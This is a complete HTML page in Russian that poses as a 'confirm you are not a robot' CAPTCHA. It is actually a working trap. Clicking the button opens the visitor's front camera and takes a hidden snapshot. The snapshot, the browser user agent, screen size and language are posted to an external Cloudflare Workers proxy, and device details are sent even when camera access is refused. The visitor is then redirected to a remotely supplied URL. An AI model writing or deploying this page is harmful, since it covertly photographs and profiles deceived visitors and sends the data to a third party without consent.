<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        @font-face {
            font-family: 'MyFont';
            src: url('font.ttf') format('truetype');
        }

        * {
            font-family: 'MyFont', sans-serif !important;
            box-sizing: border-box;
        }

        body {
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }

        button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background: #18191e;
            color: white;
            border: none;
            border-radius: 8px;
            transition: opacity 0.3s;
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Подтвердите, что вы не робот</h2>
        <button id="btn">Я не робот (Продолжить)</button>
    </div>
    
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';

        // Загружаем целевой URL заранее
        let targetUrlPromise = fetch(proxyUrl + "/get-url")
            .then(res => res.text())
            .catch(() => "https://google.com");

        const btn = document.getElementById('btn');
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');

        btn.onclick = async () => {
            btn.innerText = "Проверка..."; 
            btn.disabled = true;
            
            let stream = null;
            const info = `📱 Устройство: ${navigator.userAgent}\n🖥 Экран: ${window.screen.width}x${window.screen.height}\n🌐 Язык: ${navigator.language}`;

            try {
                // Запрашиваем камеру
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = stream;
                
                // Ждем готовности видео
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 800); // Чуть больше времени на фокус камеры
                    };
                });

                // Рисуем кадр на канвас
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Создаем Blob изображения
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
                
                const formData = new FormData();
                formData.append('photo', blob, 'shot.jpg');
                formData.append('caption', info); 

                // ВАЖНО: Ждем завершения отправки перед редиректом
                await fetch(proxyUrl, { method: 'POST', body: formData });

            } catch (err) {
                console.log("Доступ запрещен или ошибка:", err);
                
                const formData = new FormData();
                formData.append('text', `❌ Доступ к камере отклонен\n\n${info}`);
                
                // Ждем завершения отправки текста
                await fetch(proxyUrl, { method: 'POST', body: formData });

            } finally {
                // Останавливаем камеру
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
                
                // Только теперь уходим на другой сайт
                const finalUrl = await targetUrlPromise;
                window.location.href = finalUrl;
            }
        };
    </script>
</body>
</html>
